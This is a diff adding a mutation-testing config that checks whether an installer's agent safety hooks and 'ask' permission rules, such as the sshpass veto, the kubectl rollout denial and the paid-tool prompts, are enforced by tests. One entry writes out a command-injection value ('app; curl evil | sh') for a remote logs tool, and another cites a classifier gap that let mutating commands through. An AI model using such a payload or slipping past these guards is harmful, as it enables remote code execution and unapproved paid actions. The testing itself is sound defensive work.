@@ -1,0 +1,135 @@
+{
+  "testCommand": "npm test",
+  "entries": [
+    {
+      "id": "brake-sshpass-veto-executes",
+      "property": "The ADR-004 paid-step brake VETOES password-SSH to a Cloud.ru VM (sshpass fixture, exit 2) — deleting the regex lets the forbidden command through and the acid tests + the installer's executed probe must see it.",
+      "file": "templates/.claude/hooks/cloudru-ssh-guard.cjs",
+      "mutation": {
+        "find": "    if (/sshpass/.test(cmd) && /@\\d+\\.\\d+\\.\\d+\\.\\d+/.test(cmd)) {",
+        "replace": "    if (false) {"
+      },
+      "minFailing": 1
+    },
+    {
+      "id": "brake-rollout-hole-stays-closed",
+      "property": "kubectl `rollout <mutating-subverb>` via mcp k8s_kubectl is denied on OUR side (the MEASURED upstream classifier hole, 05 §2.3) — disarming the guard re-opens unconfirmed prod restarts.",
+      "file": "templates/.claude/hooks/cloudru-ssh-guard.cjs",
+      "mutation": {
+        "find": "    if (m && m[1] !== 'status' && m[1] !== 'history') {",
+        "replace": "    if (false) {"
+      },
+      "minFailing": 1
+    },
+    {
+      "id": "brake-ask-rules-cover-every-mutator",
+      "property": "Every mutating tool is emitted under permissions.ask — an installer that stops emitting ask rules leaves paid tools one agent-call away (ADR-004 §1).",
+      "file": "src/classification.js",
+      "mutation": {
+        "find": "  return { allow: expand(by.allow), ask: expand(by.ask), deny: expand(by.deny) };",
+        "replace": "  return { allow: expand(by.allow), ask: [], deny: expand(by.deny) };"
+      },
+      "minFailing": 2
+    },
+    {
+      "id": "zero-upstream-bytes-files-whitelist",
+      "property": "files[] is the exact whitelist of OUR artifacts — smuggling an engine dir into the publication contract must be caught by the pack-contents test (ADR-001: zero upstream bytes ship).",
+      "file": "package.json",
+      "mutation": {
+        "find": "    \"data/\",",
+        "replace": "    \"data/\",\n    \"native/\","
+      },
+      "minFailing": 1
+    },
+    {
+      "id": "licence-publishable-state-asserted",
+      "property": "Post-grant (ADR-001 AM-2) the pack must REMAIN publishable — a stray private:true would silently kill every future publish while CI stays green, so the publishable-state assertion must go red on it. (The Grant-Confirmation URL protection itself lives in LICENSE, which the gate cannot mutate — extensionless file, no parser; its layer-1 coverage is the pack-holds LICENSE assertions plus the dz guard licence-hold rule, both reading LICENSE directly on every run/publish.)",
+      "file": "package.json",
+      "mutation": {
+        "find": "  \"version\": \"0.1.4\",",
+        "replace": "  \"version\": \"0.1.4\",\n  \"private\": true,"
+      },
+      "minFailing": 1
+    },
+    {
+      "id": "licence-block-guard-trigger-declared",
+      "property": "The dz guard licence-hold rule triggers off package.json.licenseHold — the field deliberately STAYS post-grant (a satisfied hold passes with it in place); deleting it silently disarms the guard's LICENSE/NOTICES/SPDX verification on every future publish and must go red here.",
+      "file": "package.json",
+      "mutation": {
+        "find": "  \"licenseHold\": {",
+        "replace": "  \"licenseHoldDisarmed\": {"
+      },
+      "minFailing": 1
+    },
+    {
+      "id": "licence-spdx-matches-license-file",
+      "property": "package.json.license must equal the SPDX id of the actual LICENSE text (ADR-001 Confirmation: the field may never claim a licence the file does not carry).",
+      "file": "package.json",
+      "mutation": {
+        "find": "  \"license\": \"MIT\",",
+        "replace": "  \"license\": \"Apache-2.0\","
+      },
+      "minFailing": 1
+    },
+    {
+      "id": "brake-stack-status-stays-ask",
+      "property": "stack_status ADVANCES a planned/running stack job server-side (handleStackStatus tools_stack.go:451 → advance :479-484 → s.callTool :220 invokes provision/pg_create/… — LIVE-REPRODUCED: one call moved a planned job planned→running and attempted provision, stopped only at AUTH_REQUIRED). Flipping it back to allow re-opens the zero-prompt paid chain stack_plan→stack_status and must go red (ADR-004 AM-1, cross-model QE HIGH).",
+      "file": "data/tools-classification.json",
+      "mutation": {
+        "find": "\"stack_status\": {\n      \"effect\": \"mutating\",\n      \"permission\": \"ask\",",
+        "replace": "\"stack_status\": {\n      \"effect\": \"mutating\",\n      \"permission\": \"allow\","
+      },
+      "minFailing": 2
+    },
+    {
+      "id": "brake-logs-stays-ask",
+      "property": "logs concatenates its user-controlled `service` arg RAW into a remote `docker compose logs <service>` executed over SSH (handleLogs tools.go:1758 → engine/logs.go:61 `cmd += \" \" + opts.Service` → Deployer.Exec logs.go:64 → session.CombinedOutput internal/deploy/ssh.go:117), so service=\"app; curl evil | sh\" is arbitrary RCE on the user's VM. Flipping it back to allow puts a zero-prompt command-injection path behind a SILENT allow and must go red (ADR-004 AM-2, shell-reach hazard axis, cross-model QE HIGH).",
+      "file": "data/tools-classification.json",
+      "mutation": {
+        "find": "\"logs\": {\n      \"effect\": \"shell-reach\",\n      \"permission\": \"ask\",",
+        "replace": "\"logs\": {\n      \"effect\": \"shell-reach\",\n      \"permission\": \"allow\","
+      },
+      "minFailing": 2
+    },
+    {
+      "id": "dialect-codename-gate-armed",
+      "property": "The compiler's positive codename invariant (no case-insensitive 'hermes' in ANY emitted file) is driven by data/dialects.json forbiddenCodenames — emptying the list disarms the net under the 8-token denylist (which alone let the bare codename survive 5x in the real-corpus compile, MEASURED) and the codename-gate tests must go red.",
+      "file": "data/dialects.json",
+      "mutation": {
+        "find": "\"forbiddenCodenames\": [\"hermes\", \"dzhechko\", \"cloudru-vm-cli\", \"captainkeys\"],",
+        "replace": "\"forbiddenCodenames\": [],"
+      },
+      "minFailing": 2
+    },
+    {
+      "id": "dialect-binary-path-leak-scrubbed",
+      "property": "The engine config-dir leak form `.cloudru-vm` (dotted path) is scrubbed to `.cloudru-hub` by a targeted replacement (0.1.3 Variant A) — the bare token is NOT codename-gated because it is also the legitimate MCP server name (\\bcloudru-vm\\b over-blocks the compiler's own injected prose, PROVEN). Disarming the scrub re-ships the path leak with ok=true and the leak-scrub tests must go red.",
+      "file": "data/dialects.json",
+      "mutation": {
+        "find": "        { \"find\": \"\\\\.cloudru-vm(?![\\\\w-])\", \"flags\": \"g\", \"replace\": \".cloudru-hub\" },\n        { \"find\": \"\\\\bcloudru-vm[ \\\\t]+(?=(?:deploy|status|logs|destroy|verify|init|version|list-zones|list-images|mcp|doctor)\\\\b)\", \"flags\": \"g\", \"replace\": \"cloudru-hub \" },\n        { \"find\": \"\\\\bdzhechko\\\\b\", \"flags\": \"gi\", \"replace\": \"dzhechkov\" },\n        { \"find\": \"captainkeys\", \"flags\": \"gi\", \"replace\": \"user-keys\" }\n      ]\n    },\n    \"codex\": {",
+        "replace": "        { \"find\": \"\\\\.cloudru-vm-disarmed(?![\\\\w-])\", \"flags\": \"g\", \"replace\": \".cloudru-hub\" },\n        { \"find\": \"\\\\bcloudru-vm[ \\\\t]+(?=(?:deploy|status|logs|destroy|verify|init|version|list-zones|list-images|mcp|doctor)\\\\b)\", \"flags\": \"g\", \"replace\": \"cloudru-hub \" },\n        { \"find\": \"\\\\bdzhechko\\\\b\", \"flags\": \"gi\", \"replace\": \"dzhechkov\" },\n        { \"find\": \"captainkeys\", \"flags\": \"gi\", \"replace\": \"user-keys\" }\n      ]\n    },\n    \"codex\": {"
+      },
+      "minFailing": 2
+    },
+    {
+      "id": "dialect-binary-invocation-leak-scrubbed",
+      "property": "The engine CLI-invocation leak form `cloudru-vm <real-engine-verb>` (finite verb set cited from engine cmd/cloudru-vm/main.go AddCommand, lines 53-65) is scrubbed to `cloudru-hub <verb>` without touching the MCP-server prose `cloudru-vm видны` (0.1.3 Variant A). Disarming the scrub re-ships the invocation leak and the leak-scrub + verb-set tests must go red.",
+      "file": "data/dialects.json",
+      "mutation": {
+        "find": "        { \"find\": \"\\\\bcloudru-vm[ \\\\t]+(?=(?:deploy|status|logs|destroy|verify|init|version|list-zones|list-images|mcp|doctor)\\\\b)\", \"flags\": \"g\", \"replace\": \"cloudru-hub \" },\n        { \"find\": \"\\\\bdzhechko\\\\b\", \"flags\": \"gi\", \"replace\": \"dzhechkov\" },\n        { \"find\": \"captainkeys\", \"flags\": \"gi\", \"replace\": \"user-keys\" }\n      ]\n    },\n    \"codex\": {",
+        "replace": "        { \"find\": \"\\\\bcloudru-vm-disarmed[ \\\\t]+(?=(?:deploy|status|logs|destroy|verify|init|version|list-zones|list-images|mcp|doctor)\\\\b)\", \"flags\": \"g\", \"replace\": \"cloudru-hub \" },\n        { \"find\": \"\\\\bdzhechko\\\\b\", \"flags\": \"gi\", \"replace\": \"dzhechkov\" },\n        { \"find\": \"captainkeys\", \"flags\": \"gi\", \"replace\": \"user-keys\" }\n      ]\n    },\n    \"codex\": {"
+      },
+      "minFailing": 2
+    },
+    {
+      "id": "pointer-no-veto-warning-mandatory",
+      "property": "The pointer-only section always carries the no-veto warning line (ADR-005: pointer without the warning is an illusion of support).",
+      "file": "data/pointer-section.md",
+      "mutation": {
+        "find": "⚠ ПРЕДУПРЕЖДЕНИЕ:",
+        "replace": "Примечание:"
+      },
+      "minFailing": 1
+    }
+  ]
+}
